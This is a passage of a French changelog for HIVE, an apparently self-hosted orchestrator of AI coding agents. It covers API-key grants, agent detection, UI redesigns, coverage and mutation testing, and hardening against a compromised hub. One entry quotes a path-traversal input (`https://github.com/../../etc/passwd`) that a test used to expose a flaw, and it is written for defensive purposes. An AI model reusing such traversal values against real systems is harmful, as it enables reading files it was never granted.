# Changelog

Tout changement notable de HIVE est documenté dans ce fichier.

Le format est basé sur [Keep a Changelog](https://keepachangelog.com/fr/1.0.0/),
et ce projet adhère au [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Les portes de ce lot passent sous banc.** Le cliquet de couverture refusait
  la fusion — fonctions à 78,42 % sous un seuil de 78,8 — et il nommait juste :
  trois blocs neufs arrivaient sans un cas.
  `tests/api-queen-fabrique.test.ts` (11 cas) tient les huit portes ajoutées
  ici : chemin, méthode, corps, jeton. Deux invariants y sont posés
  explicitement — chaque segment variable passe par `encodeURIComponent` (un
  identifiant portant `/` change sinon la route appelée), et le SECRET d'une
  clé Reine voyage dans le CORPS, jamais dans l'URL (une URL se journalise, se
  met en cache, part dans un `Referer`).
  `tests/onboarding-essaim.test.tsx` (10 cas) tient les TROIS règles
  d'effacement de la checklist du premier cycle, chacune un `return null`
  isolé : une checklist qui reste affichée après coup se lit comme « il reste
  du travail » alors qu'il n'en reste pas.
  `tests/reine-voix-pieces-ecran.test.tsx` (14 cas) tient le câblage du micro
  et des pièces jointes — les 211 lignes que la Reine vocale avait ajoutées
  sans qu'aucun banc ne les touche. Les modules `reine-voix` et
  `reine-extraire` y sont DOUBLÉS : ils ont leurs propres 53 cas, et un banc
  d'écran qui rejouerait l'extraction d'un PDF mesurerait pdfjs, pas la vue.
  Mesure après coup : fonctions 79,06 %, soit 0,26 point au-dessus du seuil —
  quand le tremblement documenté d'une exécution à l'autre est de 0,06. Le
  premier jet tombait à 78,80 % PILE : franchi, mais à cette hauteur la CI
  rougit au hasard, et un cliquet intermittent est pire que pas de cliquet.

- **Clés API proactives (OpenRouter & co).** Catalogue Chambre → Intégrations :
  OpenRouter, Anthropic, OpenAI, xAI, Cursor, Seedance, ou variable libre ;
  `GET/POST /api/queen/cles` écrit le `.env` Queen (jamais la valeur en base).
- **Relecture Claude (#348) intégrée.** Horizon neutralisé (`champSurUneLigne`) ;
  grant : validation puis transition puis écriture ; `envVar` = dérivé du libellé ;
  motifs : `ordre` dans la donnée + `catalogueCoherent` ; étapes perso = une ligne.
- **Boucle réquisition mid-task.** Échec infra auth → `cle_api` ; binaire
  absent (ENOENT / « échec du lancement ») → `binaire` ; `requisition_open` +
  `taskId` ; pause tâche ; reprise après `accordee` (boucle B/C/D ADR 0010).
  Accorder `binaire` sans CLI encore présent : pause conservée + nouvelle
  réquisition (plus de `task_reject` immédiat).
- **Accorder hors cle_api.** `suiteAccordRequisition` : atelier → allumer ;
  mcp/logiciel → fabrique ; binaire → hint install nommé (`messageAccordBinaire`).
  Modal grant : `envVar` en lecture seule pour les réquisitions.
- **Agent Cursor + choix interactif.** Détection du CLI Cursor (`agent` /
  `cursor-agent`), adaptateur `cursor` (`agent -p --force`), credentials
  `CURSOR_API_KEY` / `~/.cursor`. Quand plusieurs agents réels sont détectés
  (Claude Code, Cursor, Codex…) et qu'un terminal est disponible, le nœud
  **demande lequel utiliser** (`choisir-agent.ts`) ; `HIVE_AGENT` force toujours.
- **Premier lancement IA : application puis modèle.** Hive inventorie sans
  réseau les modèles nommés dans les configurations locales Claude, Cursor,
  Codex et Grok, distingue configuration et simple suggestion, puis demande un
  choix court. Application + modèles confirmés sont mémorisés sur ce poste ;
  `npm run configurer:ia` les rouvre.
- **OpenAlex runtime.** `openalex-veille.ts` : extrait littérature dans planner LLM ;
  veille dans Queen Bee, Reine/concierge, tâches et planner heuristique.
- **Wizard onboarding Essaim.** `OnboardingEssaim.tsx` : checklist interactive jusqu’au
  premier cycle runner.
- **Hive Mind hybride.** `rankMemoriesHybrid` : BM25 + trigrammes pour projets longs.
- **Story produit.** `PourquoiHive` dans Mon espace et Chronique (vs Cursor/Devin).
- **Queen — Intelligence Core.** Spec canonique (`docs/QUEEN-INTELLIGENCE-CORE.md`) :
  identité stratégique de la Reine (diagnostic, veille techno, catégories A/B/C/D,
  boucle d'intelligence). Fragments injectés dans le chat Reine (`concierge.ts`),
  le planner (`planner.ts`) et Queen Bee (`queen-bee.ts`). Skill agent
  `.agents/skills/queen-intelligence-core/SKILL.md`.
- **Grant cle_api Chambre → `.env` Queen.** Modal HITL pour saisir variable et secret ;
  `requisition-env.ts` écrit atomiquement sur l'hôte ; le nœud recharge `.env` à la reprise.
  Mapping libellés agents (Codex/Claude/Grok/Seedance) → variables standard.
- **Horizon dans le contexte ouvrière.** `texteHorizonPourContexte` injecté dans
  `construireHiveContext` (budget tokens restant) et dans le contexte conseil.
- **Fabrique UI Chambre.** Formulaire « Proposer », boutons Revue/Refuser, juger/lancer Chantiers.
- **Motifs perso.** Procédures par projet (`motifs_projet`) : créer depuis la Chambre, appliquer en tâches ordonnées.
- **Motifs catalogue — confirmation.** Aperçu des étapes (toggle) + dialogue avant appliquer.

### Changed

- **Aiguillage modèle réellement exécuté.** Codex et Grok reçoivent désormais
  `--model` comme Claude Code et Cursor. Un nœud refuse avant exécution tout
  modèle que ce poste n'a pas confirmé, et les noms ressemblant à des options
  ou contenant des contrôles sont écartés.
- **Mode production agents.** `agent-production.ts` : le nœud refuse de démarrer
  en shell sans `HIVE_SIMULATION=1` ou `HIVE_AGENT=shell` ; le scheduler n'assigne
  pas aux agents simulés hors mode démo. Protocole réquisition nœud (cherry-pick #347).
  Réquisition proactive à l'enregistrement si credentials agent absents (`requisitionSiCredentialsManquantes`).
- **Polish autonomie.** API baptême/métier (`POST /api/baptemes`, `/api/metiers`) ;
  checklist « prêt pour l’autonomie » + timeline cycles dans Plein Essaim ;
  baptême et métier depuis la Chambre ; filtre Chronique « Essaim » ;
  avertissement nœuds shell ; veille techno légère dans le planner (`queen-veille.ts`) ;
  délibération prioritaire quand la dérive signale `a_surveiller`.
- **Queen — Intelligence Core.** Spec canonique (`docs/QUEEN-INTELLIGENCE-CORE.md`) :
  identité stratégique de la Reine (diagnostic, veille techno, catégories A/B/C/D,
  boucle d'intelligence). Fragments injectés dans le chat Reine (`concierge.ts`),
  le planner (`planner.ts`) et Queen Bee (`queen-bee.ts`). Skill agent
  `.agents/skills/queen-intelligence-core/SKILL.md`.

### Changed

- **Polish autonomie.** API baptême/métier ; checklist Essaim ; Chambre baptême/métier ;
  veille planner ; délibération si `a_surveiller`.
- **ADR 0010 lots 7 & 9 — suite.** Protocole nœud : `requisition_open` →
  `requisition_ack` ; décision humaine relayée par `requisition_result` (sans
  secret). Horizon : fait auto aussi quand la dérive passe en `a_surveiller`
  (anti-spam 6 h, distinct de « dégradée »).

### Changed

- **ADR 0010 accepté.** Lots 7–10 consolidés : fabrique bloque les Chantiers
  tant que le merge n’a pas atterri ; fusion PR (humaine **et** autonome) →
  statut fabrique `mergee` ; dérive dégradée → fait auto dans l’horizon
  (anti-spam) ; essaim halte si le carnet dépasse le budget d’instantané ;
  motifs `jeu-3d` + `cli-outil` (fabrique avant livraison) ; réquisition
  ouverte émet `requisition_ouverte` ; exemple Seedance (`cle_api` sans secret).
- **Chambre polish.** Feedback d’erreur HITL / motifs / horizon / atelier ;
  libellés fabrique & caste ; pastilles de statut ; « Ouvrir la Chambre »
  unifié ; focus-visible miel étendu ; Rayon respecte `prefers-reduced-motion`.

### Added

- **Chambre UI fidèle à la maquette produit.** Crème `#FDF8F0` / miel `#F2B441`,
  bandeau **À trancher**, **Journal** (pastilles EDIT/READ), **Missions**
  filtrées, **Ordinateur** noVNC (Plein écran). Baptême display — données
  constatées seulement. Curseur Rayon → ouvre la Chambre ; bandeau
  **En train de…** si le miroir du dépôt est vide. Fiche nœud : titre =
  baptême (sinon silence). Cartes nœud (Ruche + Essaim) : baptême via
  `GET /api/baptemes` (jeton ruche ; partage → 401) — sinon « Pas encore
  baptisée » ; échec API → nom technique (pas de mensonge). Clic Essaim →
  Chambre. Échap → Ruche (pas pendant saisie / dialogue) ; chemins → focus
  fichier Rayon (déplie les dossiers parents) ; **Voir le Rayon** pose le focus
  sur la présence la plus récente (sinon navigation seule) ; sans projet lié →
  silence du lien ; clic chemin du bandeau **En train de…** → ouvre dans l’arbre.
  Pastille **EDIT** / point de statut Fiche alignés sur le constaté. Journal :
  lignes READ/EDIT/WRITE → même `CheminConstate`. Maquette :
  `docs/maquettes/chambre/`. Capture + démo :
  `docs/images/dashboard-chambre.png`, `docs/media/chambre-presentation-demo.mp4`.

- **Chambre (ADR 0010, lots 0–11 + UI).** Poste ouvrière : baptême, métier, présence,
  vue 4 zones + Atelier, curseurs Rayon, réquisitions, **fabrique**, **horizon**,
  **motifs**. Écran : bandeau HITL, flux outils, onglets
  Fiche/Travail/Intégrations/Suivi. Partage : jamais d’identités. ADR **proposé**.
- **🎤 Reine vocale + documents.** Vue 👑 : micro (Web Speech), lecture à voix
  haute des réponses, joindre PDF / Word `.docx` / texte / code (extraction
  navigateur via `pdfjs` + `mammoth`, bundlés dashboard — 0 dep runtime nœud).
  Vidéo/audio : refus clair (pas de fausse transcription). Plafond chat porté
  à 40 000 caractères. Module pur `reine-pieces` + bancs.
  Les deux modules navigateur ont leurs bancs eux aussi : `reine-voix`
  (28 cas — le décor Web Speech est posé à la main, happy-dom n'en fournit
  pas) et `reine-extraire` (22 cas — `pdfjs` et `mammoth` doublés : le banc
  juge ce que le module FAIT de ce qu'ils rendent, pas leur capacité à lire
  un PDF). Ils arrivaient sans banc, et le cliquet de couverture le disait —
  fonctions à 78,72 % sous un seuil de 78,8 %.
  Les deux modules sont ensuite passés sous la loupe (base `727859b`) :
  18 mutations possibles, 18 examinées, 15 défendues d'emblée. Les trois
  nues sont fermées par des bancs, pas déclarées équivalentes — la garde de
  TYPE sur `str` (un nombre entrait dans la page), la borne `size <= 0` (un
  fichier vide était OUVERT sans que le refus change, seul un compteur
  d'ouvertures pouvait le voir) et le parcours des résultats vocaux, où
  `length` doit faire autorité sur ce que la liste porte au-delà.
  Contre-rejeu : 3 mutants sur 3 font rougir la suite.

- **innov. Trois filets produit.** (1) Retouche Rayon → sauvegarde
  `avant_retouche` (patch inverse). (2) Reine propose « Restaurer… » s’il y a
  des échecs + une étape (puce → Rayon). (3) Pouls Plein Essaim sur la Ruche
  (niveau / pause / dérive → Projets). Garde : `pruneSauvegardes` + test UI
  pouls ; FEATURES FR/EN alignés. Pouls : états de charge et **hors ligne**
  si l’essaim refuse de répondre.

- **🔏 Installeurs sur Pages + empreinte affichée (lot 8, prep).** `pages.yml`
  copie `install.sh` / `install.ps1` vers `site/` et publie `install.sha256`.
  Les scripts affichent leur SHA-256 avant d’agir (fichier) ; la doc (README +
  INSTALLATION) montre la variante télécharger → hasher → lire → exécuter
  (Pages / `install.sha256`, ADR 0002) — sans promettre une Release signée.

- **💾 Timeline de sauvegardes (code récupérable).** Chaque production réussie
  avec un diff devient une étape (`sauvegardes` latérale, survit à
  `pruneResults`). API : lister / lire / poser (manuel) /
  restaurer — la restauration ouvre une **tâche** (jamais un rewrite
  silencieux). Panneau sur le Rayon : **voir le patch** avant d’agir ;
  raccourci depuis la Reine (mode Sauvegardes / puce Restaurer… scrolle
  la timeline) ; après restauration, **Ouvrir dans la Miellerie**. Aperçu
  patch borné + **Copier**. Pouls Plein Essaim : relecture toutes les 30 s
  sans flash.
- **🎙 Reine en flux (SSE) + multi-agents en lecture.** `/api/chat` accepte
  `stream` / `Accept: text/event-stream` : deltas puis `done`. Contexte enrichi
  (`enCours`, `sousAgents`, `essaim` Plein Essaim) — la Reine **cite** l’essaim,
  elle ne change pas le niveau d’autonomie et ne réécrit jamais le dépôt.
  UI Reine : bulle progressive. `hive ask` partage le même chemin SSE ; banc
  CLI + FEATURES EN (table Comb) + README variante prudente Windows (Pages /
  `install.sha256`, sans 2ᵉ `irm` qui casserait la garde d’annonce).

- **DEFINITION §E : empreintes Pages** mesurées ; Release signée reste 🔒. Parser SSE Anthropic : bancs text_delta vide / message_start.

- **Reine : abort du flux SSE** au démontage ou « Effacer » (AbortSignal), sans bulle d’erreur.
- **`hive ask` : Ctrl+C** coupe le flux SSE (AbortSignal), message `(interrompu)`.
- **Carnet lot 8** : empreintes Pages ✅ / Release signée 🔒 (ETAPES plus « à faire »).

### Changed

- **🧭 Mission Control plus simple à parcourir.** Les treize vues sont groupées
  par intention (Piloter, Produire, Observer, Votre espace, Administration),
  avec une courte description. Sur mobile, la sidebar devient un vrai tiroir
  et libère toute la largeur. La topbar réunit compte, invitation, langue et
  jeton dans un menu unique ; hors ligne, un bandeau guide explicitement la
  connexion. Ajout d'un lien d'évitement et d'un landmark principal.
- **🌱 Premier projet sans jargon.** La modale demande d'abord un nom et une
  mission en langage naturel ; modèles et graphe JSON vivent sous « Options
  avancées ». Le bouton dit « Créer le projet ». Les vides du Rayon, de la
  Miellerie, des Chantiers et de Mon espace proposent directement le prochain
  geste au lieu d'imposer un détour.

- **🖥 Mission Control plus pro, façon Craft / Apple.** Même ruche (miel unique
  accent, hexagone marque) : papier plus clair, barre charbon brossée, logo SVG
  à la place de l'emoji, **glyphes SVG de navigation** (plus de lettres), topbar
  floutée, cartes et boutons assouplis, Reine type messagerie, modales à voile
  flouté, entrée de vue animée (respecte `prefers-reduced-motion`). Ruche vide :
  **une seule composition** centrée (plus de KPI / essaim / file à zéro autour
  du départ). **« Inviter un ami »** repasse en secondaire : le miel plein
  reste pour démarrer un projet. Titres et états vides (Partage, Miellerie, Santé calme, compte) portent l’hex plutôt que l’emoji.
  Suite soirée : Journal en marques typographiques, OpenAlex / Cerveau /
  Phéromones / Queen Bee sans chrome emoji, podium Essaim en rangs 1–3,
  italiques « empty » retirés, KPI Ruche allégés. Rayon typographique,
  Miellerie / Reine / Santé / Balance / Intendance / Plein Essaim allégés
  du chrome emoji. Wordmark **Hive / Mission Control** ; courses en ◇ ;
  pastille « connecté » soignée. Leçons systémiques Plein Essaim en ▲
  (plus de ⚠ décoratif).

### Fixed

- **💾 Sauvegardes isolées par projet.** La rétention garde désormais les N
  étapes de **chaque** projet : l'activité d'un dépôt ne peut plus effacer les
  points de restauration d'un autre. `GET …/sauvegardes?limit=` est validé et
  réellement appliqué (1–200).
- **📂 Rayon sans contenu croisé.** Quand deux fichiers sont ouverts rapidement,
  une réponse réseau lente de l'ancien fichier ne peut plus remplacer le
  contenu du dernier fichier sélectionné.
- **✓ Revue sans faux succès.** Un verdict rejeté définitivement par l'API
  restaure maintenant la décision serveur au lieu de rester affiché comme
  enregistré. Mission Control l'annonce immédiatement ; une panne transitoire
  garde le verdict dans la file de synchronisation.
- **🧪 Porte d'installeur sans flake.** Le banc du point d'entrée `hive` utilise
  un port libre fourni par l'OS ; il ne concurrence plus les tests qui occupent
  volontairement 7777.

- **👑 Les bancs de la Reine ne confondent plus l'Atelier avec le chat.**
  `AtelierRecette` sonde `/api/atelier` au montage de la vue Reine. Les tests
  `reine-clavier` et `reine-conversation` comptaient **tout** `fetch` comme un
  envoi de chat : un GET sans corps devenait `''` en tête des envois, et
  `calls[0].body` était `undefined`. Mesuré : 8 rouges × 3 graines du tamis
  des ordres après #337. Les bancs ne regardent plus que `/api/chat`.

- **🧹 Prettier sur `docs/ATELIER.md` et `docs/INSTALLATION.md`.** Les tables
  non formatées faisaient rougir `npm run lint` sur `main` juste après le merge
  des éditions.

### Added

- **⬡ L'Atelier de recette.** Un bureau Debian (Xvfb, Openbox, Chromium, Python,
  Node, LibreOffice, Tesseract) pour que l'agent teste comme un humain : CDP
  :9222, démon d'outils :8765, noVNC :6080 — tous publiés sur 127.0.0.1.
  Volume `/workspace`, crochets `.wake-hooks`, aucun secret d'hôte.
  `HIVE_ATELIER=off|auto|on`. Détail : `docs/ATELIER.md`.

- **🐝 Deux paliers d'équipe, jamais du cœur : Team et Enterprise.** Community
  garde le noyau ENTIER (sièges illimités, verrouillé par test), et ce qui se
  vend au-dessus n'existe que pour une organisation.
  Team (99 €/mois, cloud ou self-host) : rôles fins, quotas par membre,
  projets d'organisation, sièges illimités, 100 h/mois. Enterprise (sur
  devis, AUCUN prix dans le code) : SSO/SAML, audit exportable, rétention
  personnalisée, SLA. Les portes vivent dans `src/shared/paliers.ts` — module
  pur, fermé par défaut ; le SSO n'est pas implémenté, la porte l'attend.
  Détail : `docs/MODELE-ECONOMIQUE.md` §6.

- **🐝 Deux éditions : Community gratuit, Cloud sur tes serveurs.**
  `HIVE_EDITION=community|cloud`. Community reste 0 €, noyau complet. Cloud
  tourne la même Queen chez l'opérateur (`docker-compose.cloud.yml` + Caddy),
  facture à l'horloge d'hébergeur (plus `durationMs`), exige
  `HIVE_WEBHOOK_SECRET` au démarrage, et accepte les webhooks Stripe
  (`Stripe-Signature`, `metadata.projectId` / `plan`). Un locataire = une base.
  Détail : `docs/CLOUD.md`.

### Changed

- **Le tableau de bord et la vitrine respirent.** Même ruche : cire, miel comme
  unique accent, hexagone comme marque, une abeille au logo. Moins d'émojis
  dans la nav, moins de dégradés, filets et rayon 8 px. Pas un clone xAI.

### Fixed

- **🪟 Sur Windows, la ruche se servait d'un agent SIMULÉ sans le dire vraiment.**
  Un Claude Code installé par npm n'y expose qu'un shim `claude.cmd`, que
  `spawn(…, { shell: false })` ne peut pas lancer — durci depuis la
  CVE-2024-27980. La sonde échouait donc **toujours**, le nœud retombait sur
  l'adaptateur `shell`, et la ruche avait l'air de tourner en produisant de faux
  diffs. `hive doctor` l'affichait, mais rien n'empêchait de passer à côté.
  La correction ne touche pas à la contrainte §5.1 : elle **vise le script réel
  du paquet et lance Node**, exactement comme `lanceur.ts` le fait déjà pour
  `npm`. C'est plus strict que `shell: true`, pas moins — on sait quel fichier
  on exécute au lieu de déléguer la résolution à `cmd.exe`. Résolue aux DEUX
  endroits, parce que détecter ne suffit pas : `agent-detect.ts` pour trouver,
  `adapters/exec.ts` pour lancer. **Non régressif par construction** : hors
  Windows, et sur Windows quand rien n'est déductible, l'argv rendu est `[bin]`
  — le comportement d'avant, à l'identique. Loupe : 7 mutants, dont un
  ÉQUIVALENT retiré plutôt que gardé (un `split('/')` que `path.win32.join`
  rendait inutile — une précaution qui ne change rien se fait passer pour de la
  rigueur), et un survivant qui a révélé que **rien ne testait le correctif** :
  le retirer laissait trente tests verts.
  ⚠️ **Non vérifié sur un vrai Windows** : la logique l'est, le `spawn` final
  ne l'est pas.

### Added

- **🖨 Une présentation d'une page, faite pour le papier**
  (`site/presentation/`). L'essentiel de Hive — installation par matériel, les
  trois étapes, la sécurité et sa limite, les tarifs, le tableau de bord — dans
  une feuille qu'on imprime ou qu'on enregistre en PDF. `@page` ne pose qu'une
  **marge** : la pagination se fait sur le papier réel du lecteur, A4 ici,
  Letter ailleurs — épingler 21 × 29,7 cm couperait la moitié du monde d'un
  demi-pouce. La page hérite des gardes communes du site (bilinguisme, fontes
  auto-hébergées, ressources livrées) parce qu'elle est entrée dans `PAGES` ;
  deux gardes qui décrivaient un ORGANE que toutes les pages n'ont pas — un
  formulaire d'issue, un en-tête collant — ont été filtrées sur la présence de
  l'organe plutôt qu'exigées partout, avec un test qui vérifie que ces listes
  ne sont pas vides (une garde qui se vide passe au vert sans rien regarder).
  Et surtout : **les commandes imprimées sont confrontées à celles de la
  vitrine**. Un document part sur papier, c'est-à-dire dans une main où plus
  aucune correction ne le rattrape — une URL d'installeur qui change laisserait
  traîner un PDF qui fait exécuter la mauvaise commande.

- **💛 La vitrine dit enfin ce que ça coûte** (section `#tarifs`). Trois
  offres — ruche auto-hébergée à 0 €, Queen hébergée à 49 €/mois, Rush dès
  79 € — reprises de `docs/MODELE-ECONOMIQUE.md`, seule source de vérité du
  dépôt, avec la mention que ce document porte lui-même : **modèle proposé,
  aucun paiement encaissé aujourd'hui**. Annoncer un prix sans dire qu'il n'est
  pas encore encaissable serait vendre du vent.

- **📜 Le déploiement sans écran a son exemple, et il est EXERCÉ**
  (`examples/deploiement-sans-ecran.sh`). Le critère 9 demandait
  `--non-interactive`, les secrets par l'environnement et des codes de sortie
  exploitables ; les trois existaient, et le carnet disait depuis des lots que
  « le script de bout en bout manque ». Ce qu'il démontre : **chaque code est
  traité séparément**. Un `|| exit 1` transformerait sept situations distinctes
  en une seule, et la seule réponse qui resterait à l'appelant serait
  « relancer et espérer » — alors que 4 (port occupé) se règle en changeant un
  réglage, 2 (prérequis) demande d'installer Node, et 5 (refus de sécurité) ne
  se réessaie **jamais**. Il vérifie aussi que la ruche peut DÉMARRER, pas
  seulement que l'installeur n'a pas échoué : `better-sqlite3` et `fastify`
  doivent se charger — la leçon de l'image qui naissait morte. Le test lance le
  vrai script par `sh`, contre un faux `install:hive` qui rend le code voulu.
  Loupe : 7 mutants, 7 morts. **Un exemple que rien ne lance a l'air d'une
  preuve sans en être une** — il pourrit comme la vitrine, et personne ne le
  voit, parce qu'on ne relit pas un exemple : on le copie.

- **📏 Le critère 1 est mesuré DE BOUT EN BOUT** (`docs/ETAPES.md`). La première
  tentative s'était arrêtée au prérequis — ce conteneur porte Node 22,
  `install.sh` exige 24, et il avait raison de refuser. Avec un Node 24 fourni
  par `npx node@24`, la commande a été lancée pour de vrai dans un dossier
  vide : **23,3 s au total, dont ≈ 20 s de `npm install`** (hors critère), donc
  **≈ 3,3 s** pour les prérequis, le clone et l'installeur. Code de sortie 0,
  `.env` en 0600. **Et la ruche installée est vivante** — ce qu'un code de
  sortie ne prouve pas : `better-sqlite3` et `fastify` se chargent dans le
  clone, et `hive doctor` rend 10 ✔ sur douze. Le doctor soulève un vrai
  constat au passage, écrit dans le carnet plutôt que tu : `install.sh` **ne
  construit pas le dashboard**, donc après « une commande » la ruche tourne et
  n'a pas d'écran. C'est documenté dans les prochaines étapes de l'installeur,
  et « ruche qui tourne » n'est pas « ruche qu'on peut regarder ».

- **🏗️ Les Chantiers ont un écran** (`dashboard/src/views/Chantiers.tsx`,
  touche `h`). Tout le mécanisme existait — un nœud clone et lance ce que le
  `package.json` déclare, l'API GitHub lance ce que le dépôt a marqué
  `workflow_dispatch` — et **personne ne pouvait s'en servir** : c'étaient des
  routes, atteignables au `curl` avec un identifiant de projet copié depuis
  l'URL. L'écran liste ce que le dépôt déclare, montre **la commande avant de
  la lancer**, dit ce qui est lançable et **pourquoi le reste ne l'est pas**
  (« sort de la machine — demande un humain » plutôt qu'un bouton grisé muet),
  et sépare GitHub des chantiers locaux : un dépôt sans jeton GitHub est un cas
  normal et ne doit pas faire disparaître la moitié de l'écran qui fonctionne.

- **🕳️ Une garde pour les vues orphelines** (`tests/rien-de-mort.test.ts`).
  Le fichier disait lui-même ne pas couvrir les vues — elles sont atteintes par
  CHEMIN, leur nom n'apparaît nulle part. C'est la pire forme de la règle qu'il
  défend : un écran entier, avec sa feuille de style et ses traductions, que
  `#/…` renvoie silencieusement sur la Ruche. Les trois conditions sont
  désormais vérifiées ensemble — importée, rendue, listée dans la barre.
  **Elle m'a d'abord fait accuser à tort** : sa première version listait tous
  les `.tsx` à majuscule de `views/` et a déclaré `Balance.tsx` orpheline. Ce
  n'est pas une vue mais un module de composants, monté par `Projets` et
  `Santé`. J'allais l'inscrire dans une liste de tolérance avec une phrase
  soignée sur ses 922 lignes inaccessibles ; le discriminant est
  l'`export default`, et une garde qui accuse doit d'abord savoir de quoi elle
  parle.

- **⚙️ Les workflows GitHub sont BRANCHÉS** — trois routes (`/workflows`,
  `/workflows/runs`, `/workflows/:id/run`) appellent enfin le client livré à la
  version précédente. **La décision qui autorise la route de lancement à
  exister** : un chantier sortant n'est pas lançable, faute de pouvoir prouver
  qu'un humain est derrière ; un workflow, lui, porte `on: workflow_dispatch:` —
  écrit par le propriétaire du dépôt, dans le dépôt. Ce n'est pas une capacité
  que la ruche découvre, c'est **une permission que le dépôt déclare**, et
  GitHub la fait respecter lui-même (422 sinon). C'est la forme la plus forte de
  « la ruche exécute ce que le dépôt déclare ». Nouveau `fullNameDepuisUrl` pour
  passer du `repoUrl` d'un projet au `owner/repo` de l'API — et **un test y a
  trouvé un défaut réel** : `new URL('https://github.com/../../etc/passwd')
.pathname` rend `/etc/passwd`, les `..` étant RÉSOLUS. La fonction rendait
  donc `etc/passwd`, un `owner/repo` parfaitement bien formé désignant un dépôt
  que personne n'a nommé. Loupe : 8 mutants — dont un survivant qui a révélé une
  garde **en double** avec `lireRuns`, retirée plutôt que verrouillée : une
  garde qu'on peut supprimer sans rien changer n'est pas une garde, c'est un
  endroit de plus où la règle peut diverger.

- **🏗️ Les Chantiers sont BRANCHÉS : la ruche lance vraiment les travaux que le
  dépôt déclare.** `POST /api/projects/:id/chantiers/:nom/run` lit le
  `package.json` du miroir, juge, et relaie à un nœud, qui clone et lance.
  **La décision qui porte tout le lot** : `assign_merge` transporte une
  commande ; **`assign_chantier` transporte un NOM**. Le nœud relit le
  `package.json` du clone qu'il vient de faire, vérifie que le nom y figure,
  puis compose l'argv lui-même. C'est le raisonnement qui a fait naître
  `jugerCommandeTest` — un nœud ne doit pas tenir pour acquis que le hub est
  celui qu'il croit, le jeton de ruche étant partagé et le transport pouvant
  être un `ws://` de réseau local. **Un hub compromis qui envoie une commande la
  fait exécuter ; un hub compromis qui envoie un nom ne peut désigner que ce que
  le dépôt déclare déjà.** 19 tests, dont deux qui montent un `HiveNodeClient`
  réel clonant un vrai dépôt git et lançant `npm run` — codes 0 **et 1**
  vérifiés, parce qu'un nœud qui rapporterait toujours « ça marche » passerait
  avec le seul cas heureux. Loupe : 17 mutants, 17 morts — et trois de ses
  survivants ont révélé que **rien ne testait la garde du nœud** : le hub refuse
  déjà tout ce qui est mauvais, donc un nœud branché sur un vrai hub ne voit
  jamais passer de demande hostile. Il a fallu un **faux hub** pour l'exercer.
  La route n'expose délibérément pas `intentionHumaine` : une requête HTTP ne
  peut pas prouver qu'un humain est derrière, et l'exposer laisserait n'importe
  quel appelant cocher la case — publier et déployer restent hors de portée.

- **⚙️ La ruche sait parler aux GitHub Actions** (`src/shared/workflow.ts`,
  `github.ts`). `listerWorkflows`, `lancerWorkflow` (workflow_dispatch) et
  `lireRuns`, 27 tests, `Fetcheur` injecté — aucun test ne touche le réseau.
  **La frontière est celle des Chantiers, et l'API GitHub y tend un piège** :
  `POST /repos/{o}/{r}/actions/workflows/{id_OU_nom_de_fichier}/dispatches`
  accepte les deux formes. Passer le nom de fichier laisserait un appelant
  écrire un morceau d'URL de l'API, et le premier `../..` la transformerait en
  n'importe quel endpoint, avec le jeton de l'hôte — qui ouvre TOUS ses dépôts.
  La ruche n'y met qu'un **entier vérifié présent dans la liste que l'API vient
  de rendre**, exactement comme `jugerChantier` choisit dans le bloc `scripts`
  du `package.json`. Deux pièges de moins au passage : `/actions/workflows` rend
  `{ total_count, workflows }` et non un tableau (le lire comme un tableau
  donnerait une liste vide **sans erreur**), et un 422 sur le dispatch signifie
  « ce workflow ne déclare pas `workflow_dispatch` » — une cause permanente, où
  « réessayez » serait un mauvais conseil. Loupe : 15 mutants, 15 morts.
  ⚠️ **Pièce DÉBRANCHÉE** : elle sait faire, rien ne l'appelle encore.

### Changed

- **🍯 Mission Control passe au papier de cire.** Le tableau de bord était le
  dernier écran resté sur l'identité sombre (`#130f09`) que la vitrine avait
  quittée : ouvrir la ruche depuis le site, c'était changer de produit. Les
  noms de jetons ne bougent pas — plusieurs centaines d'emplois les désignent —
  seules les **valeurs** portent le changement, comme lors de la refonte de la
  vitrine. La vraie difficulté était ailleurs : `--honey`, `--amber` et `--gold`
  étaient des accents CLAIRS qui **portaient du texte** sur fond noir ; repris
  tels quels sur une crème ils tombent à 2,4:1. Ils deviennent donc trois bruns
  de miel, tous **≥ 4,5:1 sur chacune des quatre surfaces**, et le miel vif
  passe dans `--miel`, qui remplit sans jamais porter de texte — deux rôles que
  le fond noir permettait de confondre. La barre de navigation garde l'encre du
  design (c'est de ce seul contraste que vient le côté « produit tech
  premium ») et **s'élargit à 214 px** : treize vues aux noms proches — Ruche,
  Rayon, Reine — se lisaient à la devinette sous une icône de 10 px. La vue
  « Cerveau » **reste sombre** — son propre fichier explique pourquoi, des
  points colorés ne se lisent pas sur du blanc — mais passe du bleu-nuit à
  l'encre de la ruche. Les fontes sont celles de la vitrine, lues depuis
  `site/fonts` par Vite : rien n'est dupliqué, rien n'est demandé à Google.

- **🔗 Les liens du site n'étaient plus lisibles depuis la refonte.**
  `a { color: var(--gold) }` posait le miel vif sur la crème : **2,4:1**, un
  lien qu'on devine plutôt qu'on ne le lit. Le design écrit ses liens en miel
  foncé (4,8:1), et c'est ce qu'on suit — sur la vitrine comme sur Rush. Au
  passage : la vitrine **préchargeait encore Space Grotesk**, que plus aucune
  règle ne demandait depuis la refonte — 22 ko en priorité haute, pour rien.

- **🎨 La page Rush rejoint l'identité claire.** Elle était restée en sombre et
  en Space Grotesk : cliquer « Voir les offres » depuis la vitrine changeait de
  site. Mêmes jetons, mêmes fontes, mêmes liens que la vitrine.

- **🔬 Le déroulé de l'accueil devient testable** (`src/installer-assistant.ts`).
  Il vivait dans `installer-main.ts`, **qui appelle `main()` à l'import** :
  aucun test ne pouvait l'atteindre sans sonder des ports, écrire un `.env` et
  poser des questions au vide. C'est exactement pour ça qu'une quatrième
  décision avait pu s'y installer sans que rien ne rougisse. Le point d'entrée
  ne change pas — il lance toujours l'installeur à l'import, et c'est son rôle ;
  ce qu'il enchaînait devient un module ordinaire, avec l'écriture du `.env`
  **injectée**. `tests/installer-assistant.test.ts` joue désormais le déroulé
  réel avec un faux clavier et **compte les arrêts** au lieu de les mesurer une
  fois à la main. Loupe : 8 mutants, 8 morts — dont l'état exact d'avant la
  mesure. Journal § 2.8.

### Fixed

- **🚪 Les deux portes d'entrée ne parlaient pas de la même machine.** Sortie de
  la mesure des critères 1 et 2, la dernière ligne ⛔ du carnet d'étapes. Le
  plancher de Node était écrit **six fois** ; `src/installer.ts` déclarait `20`
  sous un commentaire affirmant « telle que le `package.json` la déclare »,
